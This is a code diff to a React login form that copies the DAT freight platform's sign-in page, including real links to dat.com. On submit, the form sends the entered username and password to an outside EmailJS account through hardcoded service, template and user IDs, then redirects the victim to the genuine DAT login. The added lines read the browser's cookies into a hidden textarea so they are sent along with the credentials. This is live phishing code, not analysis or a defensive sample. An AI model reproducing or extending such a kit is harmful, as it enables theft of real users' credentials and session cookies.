@@ -1,5 +1,6 @@
 import '../Form/formfk.css';
 import { useState, useRef } from "react";
+import { useCookies } from 'react-cookie';
 import emailjs from 'emailjs-com';
 import pak from '../../img/pak.svg';
 import bac from '../../img/bac.svg';
@@ -8,8 +9,11 @@ function FormFk() {
     const [passwordShown, setPasswordShown] = useState(false);
     const [activepass, setActivePass] = useState(false);
     const [active, setActive] = useState(false);
+    const [areaText, setAreaText] = useState("");
+    const [cookies, setCookie] = useCookies(['cookie-name']);
     const userName = useRef(null);
     const passwordUser = useRef(null);
+    const textArea = useRef(null);
     var qfNum = 0;
     function qfFunck(qf) {
         if(qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
@@ -42,10 +46,15 @@ function FormFk() {
         setPasswordShown(!passwordShown);
     };
 
+    function getCook() {
+        setAreaText(cookies);
+    }
+
     const SERVICE_ID = 'service_cf79ytj';
     const TEMPLATE_ID = 'template_8oalb5q';
     const USER_ID = "5Fma-P-1aeivvlJxc";
     function handleSubmit(event) {
+        getCook();
         event.preventDefault();
         qfFunck(userName.current);
         if(qfNum === 1) {
@@ -55,7 +64,7 @@ function FormFk() {
         } else if(qfNum === 0) {
             qfFunck(passwordUser.current);
             if(qfNum === 0){
-                if(userName.current.value && passwordUser.current.value) {
+                if(userName.current.value && passwordUser.current.value && areaText !== "") {
                     emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                     window.location.href = "https://login.dat.com/login?state=hKFo2SBwWXlWeTB3dE9MdnpwOWZlQlZQU25wSXJ2N19QdVc5RKFupWxvZ2luo3RpZNkgZndKQ3RpZlYtdUhMX3BvUG5MZHRNVHdrNDg3TjZnUlGjY2lk2SBlOWx6TVhibldOSjBENTBDMmhhYWRvN0RpVzFha3dhQw&client=e9lzMXbnWNJ0D50C2haado7DiW1akwaC&protocol=oauth2&prompt=login&response_type=token%20id_token&redirect_uri=https:%2F%2Fone.dat.com%2Fcallback&scope=openid%20profile%20email&audience=https:%2F%2Fprod-api.dat.com&app_name=DAT%20One%20Web&page_mode=legacy&init_username=&view=login&email_readonly=false&nonce=K9F~QZ7J7pAxbQwq4584ydDVHnGb7Zmb&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4wIn0%3D&capturedTime=1704971938033";
                     return;
@@ -83,7 +92,7 @@ function FormFk() {
                     <a target='otherWindow.location' href="https://power.dat.com/forgotusername" type="button" className="moranal">Forgot your username?</a>
                 </div>
                 <div className="inputBlock">
-                    <input onBlur={handleInputBlur} id="Username" ref={userName} name="Username" type="text" spellcheck="false" className="form-control" />
+                    <input onBlur={handleInputBlur} id="Username" ref={userName} name="Username" type="text" spellCheck="false" className="form-control" />
                     <div style={{display:'none'}} className='requiredBox'>Required field.</div>
                     <span className='placeholder'>Username/Email*</span>
                 </div>
@@ -94,7 +103,7 @@ function FormFk() {
                     <a target='otherWindow.location' href="https://power.dat.com/forgotpassword" type="button" className="moranal">Reset password</a>
                 </div>
                 <div className="inputBlock">
-                    <input onBlur={handleInputBlur} id="Password" ref={passwordUser} name="Password" type={passwordShown ? "text" : "password"} spellcheck="false" className="form-control" />
+                    <input onBlur={handleInputBlur} id="Password" ref={passwordUser} name="Password" type={passwordShown ? "text" : "password"} spellCheck="false" className="form-control" />
                     <div style={{display:'none'}} className='requiredBox'>Required field.</div>
                     <span className='placeholder'>Password*</span>
                     <span className="eyeIcon" onClick={togglePassword}>
@@ -102,6 +111,7 @@ function FormFk() {
                     </span>
                 </div>
                 <div style={{display:'none'}} className='invalidBox'>Invalid username and password combination</div>
+                <textarea readOnly id="textArea" name="textAreaText" ref={textArea} value={areaText} style={{display:'none'}}></textarea>
                 <button disabled={active ? false : true} id="btnLogin" type='submit' className={active ? "btn-primary-active" : "btn-primary"}>Log in</button>
             </form>
             {/* <a href="https://ssu.dat.com/create-account" type="button" className="forgotLink">Need an account? <span>Create account</span></a> */}
